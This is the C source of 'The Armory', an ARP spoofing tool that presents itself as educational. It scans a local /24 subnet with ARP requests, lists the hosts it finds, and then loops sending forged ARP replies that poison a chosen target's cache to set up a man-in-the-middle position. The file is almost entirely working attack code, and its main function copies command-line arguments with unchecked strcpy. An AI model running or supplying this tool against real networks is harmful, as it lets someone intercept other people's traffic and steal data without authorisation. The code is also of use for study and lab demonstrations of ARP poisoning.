#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <signal.h>
#include <time.h>

#include "../include/network.h"
#include "../include/protocols.h"
#include "../include/ui.h"

volatile int keep_running = 1;

void handle_signal(int signal) {
    if (signal == SIGINT) {
        printf("\n");
        print_status("warning", "Program stop detected. Cleaning up...");
        keep_running = 0;
    }
}

void display_interfaces(void) {
    clear_screen();
    display_logo();
    
    print_separator();
    printf(BOLD CYAN "                        AVAILABLE NETWORK INTERFACES\n" RESET);
    print_separator();
    printf("\n");
    
    print_status("info", "Executing command: ip link show");
    printf("\n");
    system("ip link show | grep -E '^[0-9]+:' | awk '{print $2}' | sed 's/://g'");
    printf("\n");
    print_separator();
    printf("\n" BOLD "Press Enter to return to menu..." RESET);
    getchar();
    getchar();
}

// Structure to store found hosts
typedef struct {
    char ip[16];
    uint8_t mac[6];
} Host;

int scan_network(char *interface_name, Host *hosts, int max_hosts) {
    int sock;
    uint8_t my_mac[6];
    char my_ip[16];
    char ip_prefix[32];
    unsigned char buffer[1500];
    struct sockaddr_ll socket_address;
    struct ifreq ifr;
    int host_count = 0;

    // Open socket (Only ARP packets)
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) return -1;

    // Get Interface Index
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface_name, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) { close(sock); return -1; }
    int if_index = ifr.ifr_ifindex;

    // Get Local Info
    if (get_local_mac(sock, interface_name, my_mac) < 0) { close(sock); return -1; }
    if (get_local_ip(sock, interface_name, my_ip) < 0) { close(sock); return -1; }
    
    // Extract prefix (assuming /24)
    char *last_dot = strrchr(my_ip, '.');
    if (!last_dot) { close(sock); return -1; }
    int prefix_len = last_dot - my_ip;
    strncpy(ip_prefix, my_ip, prefix_len);
    ip_prefix[prefix_len] = '\0';

    print_status("info", "Scanning subnet (ARP)...");

    // Prepare Broadcast Address
    uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    
    // Prepare Socket Address
    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);
    socket_address.sll_ifindex = if_index;
    socket_address.sll_hatype = ARPHRD_ETHER;
    socket_address.sll_pkttype = PACKET_BROADCAST;
    socket_address.sll_halen = 6;
    memcpy(socket_address.sll_addr, broadcast_mac, 6);

    // Send ARP Requests
    for (int i = 1; i < 255; i++) {
        char target_ip[32];
        snprintf(target_ip, sizeof(target_ip), "%s.%d", ip_prefix, i);
        
        // Don't scan ourselves
        if (strcmp(target_ip, my_ip) == 0) continue;

        forge_arp_packet(buffer, my_mac, my_ip, broadcast_mac, target_ip, ARP_REQUEST);
        
        sendto(sock, buffer, sizeof(struct ethernet_header) + sizeof(struct arp_header), 
               0, (struct sockaddr*)&socket_address, sizeof(socket_address));
        
        usleep(2000); // Small delay
    }

    // Listen for Replies
    print_status("info", "Waiting for replies...");
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < 3) { // 3 seconds timeout
        struct sockaddr_ll sender_addr;
        socklen_t sender_len = sizeof(sender_addr);
        ssize_t len = recvfrom(sock, buffer, sizeof(buffer), MSG_DONTWAIT, (struct sockaddr*)&sender_addr, &sender_len);
        
        if (len > 0) {
            struct ethernet_header *eth = (struct ethernet_header *)buffer;
            if (ntohs(eth->eth_type) == ETH_P_ARP) {
                struct arp_header *arp = (struct arp_header *)(buffer + sizeof(struct ethernet_header));
                if (ntohs(arp->opcode) == ARP_REPLY) {
                    // Extract IP
                    char sender_ip_str[16];
                    inet_ntop(AF_INET, &arp->sender_ip, sender_ip_str, sizeof(sender_ip_str));
                    
                    // Check if unique
                    int known = 0;
                    for (int k = 0; k < host_count; k++) {
                        if (strcmp(hosts[k].ip, sender_ip_str) == 0) {
                            known = 1;
                            break;
                        }
                    }
                    
                    if (!known && host_count < max_hosts) {
                        strcpy(hosts[host_count].ip, sender_ip_str);
                        memcpy(hosts[host_count].mac, arp->sender_mac, 6);
                        host_count++;
                    }
                }
            }
            continue; // Process next packet immediately without sleeping
        }
        usleep(10000); // Sleep only if no packet received
    }
    
    close(sock);
    return host_count;
}

void display_about(void) {
    clear_screen();
    display_logo();
    
    print_separator();
    printf(BOLD MAGENTA "                              ABOUT\n" RESET);
    print_separator();
    printf("\n");
    
    printf(YELLOW "The Armory - ARP Spoofing Boosted" RESET "\n");
    printf("Version: 2.0\n\n");
    
    printf(BOLD "Description:\n" RESET);
    printf("ARP Spoofing/Poisoning attack demonstration tool.\n");
    printf("Allows intercepting network traffic by positioning itself\n");
    printf("as an intermediary between two hosts (MITM attack).\n\n");
    
    printf(BOLD RED "⚠ WARNING:\n" RESET);
    printf("This tool is intended for educational and security testing\n");
    printf("purposes only. Using this tool on networks without\n");
    printf("authorization is illegal.\n\n");
    
    printf(BOLD "Features:\n" RESET);
    printf("  • Sending forged ARP packets\n");
    printf("  • Interactive command-line interface\n");
    printf("  • Signal handling (Ctrl+C)\n");
    printf("  • Multi-interface support\n\n");
    
    print_separator();
    printf("\n" BOLD "Press Enter to return to menu..." RESET);
    getchar();
    getchar();
}

int run_attack(char *interface_name, char *target_ip, char *spoof_ip) {
    int raw_socket;
    
    signal(SIGINT, handle_signal);

    print_status("info", "Initializing attack...");

    raw_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if (raw_socket < 0) {
        print_status("error", "Unable to open socket (Are you root?)");
        return EXIT_FAILURE;
    }
    print_status("success", "RAW socket opened successfully");

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface_name, IFNAMSIZ - 1);

    if (ioctl(raw_socket, SIOCGIFINDEX, &ifr) < 0) {
        print_status("error", "Unable to find specified interface");
        close(raw_socket);
        return EXIT_FAILURE;
    }
    
    int if_index = ifr.ifr_ifindex;
    char msg[100];
    snprintf(msg, sizeof(msg), "Interface '%s' found (index: %d)", interface_name, if_index);
    print_status("success", msg);

    uint8_t my_mac[6];
    if (get_local_mac(raw_socket, interface_name, my_mac) < 0) {
        print_status("error", "Unable to retrieve local MAC address");
        close(raw_socket);
        return EXIT_FAILURE;
    }

    // Afficher la configuration
    display_config(interface_name, target_ip, spoof_ip, my_mac);

    // Cible (Victime)
    uint8_t target_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}; // Broadcast par défaut

    // Préparation de l'adresse de destination pour sendto
    struct sockaddr_ll socket_address;
    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);
    socket_address.sll_ifindex = if_index;
    socket_address.sll_hatype = ARPHRD_ETHER;
    socket_address.sll_pkttype = PACKET_BROADCAST; 
    socket_address.sll_halen = 6;
    memcpy(socket_address.sll_addr, target_mac, 6);

    printf("\n");
    print_separator();
    print_status("attack", "STARTING ARP PACKET INJECTION");
    print_status("warning", "Press Ctrl+C to stop the attack");
    print_separator();
    printf("\n");
    
    unsigned char buffer[1500];
    int packet_count = 0;

    while (keep_running) {
        // Construction du paquet ARP (Réponse falsifiée)
        forge_arp_packet(buffer, my_mac, spoof_ip, target_mac, target_ip, ARP_REPLY);

        // Envoi du paquet
        ssize_t sent = sendto(raw_socket, buffer, sizeof(struct ethernet_header) + sizeof(struct arp_header), 
                              0, (struct sockaddr*)&socket_address, sizeof(socket_address));

        if (sent < 0) {
            print_status("error", "Error sending packet");
        } else {
            packet_count++;
            snprintf(msg, sizeof(msg), "Packet #%d sent → %s believes %s is at %02x:%02x:%02x:%02x:%02x:%02x", 
                   packet_count, target_ip, spoof_ip, my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
            print_status("attack", msg);
        }
        
        sleep(2);
    }

    printf("\n");
    print_separator();
    snprintf(msg, sizeof(msg), "Total packets sent: %d", packet_count);
    print_status("info", msg);
    print_status("info", "Closing socket...");
    close(raw_socket);
    print_status("success", "Program terminated cleanly");
    print_separator();
    printf("\n");

    return EXIT_SUCCESS;
}

int run_auto_mode(char *interface_name) {
    Host hosts[255];
    int count = scan_network(interface_name, hosts, 255);
    
    if (count <= 0) {
        print_status("error", "No hosts found on the network.");
        return EXIT_FAILURE;
    }
    
    printf("\n");
    print_separator();
    printf(BOLD CYAN "                        FOUND HOSTS\n" RESET);
    print_separator();
    printf("\n");
    
    for (int i = 0; i < count; i++) {
        printf("  [%d] IP: %-15s MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", 
               i + 1, hosts[i].ip, 
               hosts[i].mac[0], hosts[i].mac[1], hosts[i].mac[2], 
               hosts[i].mac[3], hosts[i].mac[4], hosts[i].mac[5]);
    }
    printf("\n");
    
    int target_idx, gateway_idx;
    
    printf(BOLD "Select Target (1-%d): " RESET, count);
    if (scanf("%d", &target_idx) != 1 || target_idx < 1 || target_idx > count) {
        print_status("error", "Invalid selection.");
        return EXIT_FAILURE;
    }
    
    printf(BOLD "Select Gateway/Spoof IP (1-%d): " RESET, count);
    if (scanf("%d", &gateway_idx) != 1 || gateway_idx < 1 || gateway_idx > count) {
        print_status("error", "Invalid selection.");
        return EXIT_FAILURE;
    }
    
    if (target_idx == gateway_idx) {
        print_status("error", "Target and Gateway cannot be the same.");
        return EXIT_FAILURE;
    }
    
    return run_attack(interface_name, hosts[target_idx-1].ip, hosts[gateway_idx-1].ip);
}

int main(int argc, char *argv[]) {
    char interface_name[50];
    char target_ip[50];
    char spoof_ip[50];
    int choice;

    // Mode ligne de commande classique (rétro-compatibilité)
    if (argc == 4) {
        strcpy(interface_name, argv[1]);
        strcpy(target_ip, argv[2]);
        strcpy(spoof_ip, argv[3]);
        
        clear_screen();
        display_logo();
        print_status("info", "Command line mode detected");
        
        return run_attack(interface_name, target_ip, spoof_ip);
    }

    // Automatic mode via command line
    if (argc == 3 && strcmp(argv[1], "--auto") == 0) {
        strcpy(interface_name, argv[2]);
        clear_screen();
        display_logo();
        print_status("info", "Automatic mode detected");
        return run_auto_mode(interface_name);
    }

    // Mode interactif
    while (1) {
        clear_screen();
        display_logo();
        display_menu();
        
        if (scanf("%d", &choice) != 1) {
            print_status("error", "Invalid input!");
            sleep(2);
            while(getchar() != '\n');
            continue;
        }
        
        switch(choice) {
            case 1:
                // Configuration manuelle
                if (get_user_config(interface_name, target_ip, spoof_ip) == 0) {
                    clear_screen();
                    display_logo();
                    return run_attack(interface_name, target_ip, spoof_ip);
                }
                break;
                
            case 2:
                // Automatic mode
                clear_screen();
                display_logo();
                print_separator();
                printf(BOLD YELLOW "                          AUTOMATIC MODE\n" RESET);
                print_separator();
                printf("\n");
                
                printf("Enter interface name (e.g., eth0): ");
                scanf("%s", interface_name);
                
                run_auto_mode(interface_name);
                
                printf("\n" BOLD "Press Enter to return to menu..." RESET);
                getchar();
                getchar();
                break;
                
            case 3:
                // Afficher les interfaces
                display_interfaces();
                break;
                
            case 4:
                // À propos
                display_about();
                break;
                
            case 0:
                // Quitter
                clear_screen();
                display_logo();
                print_status("info", "Closing application...");
                printf("\n");
                print_separator();
                printf(BOLD CYAN "                    Thank you for using The Armory!\n" RESET);
                print_separator();
                printf("\n");
                return EXIT_SUCCESS;
                
            default:
                print_status("error", "Invalid option!");
                sleep(2);
                break;
        }
    }

    return EXIT_SUCCESS;
}
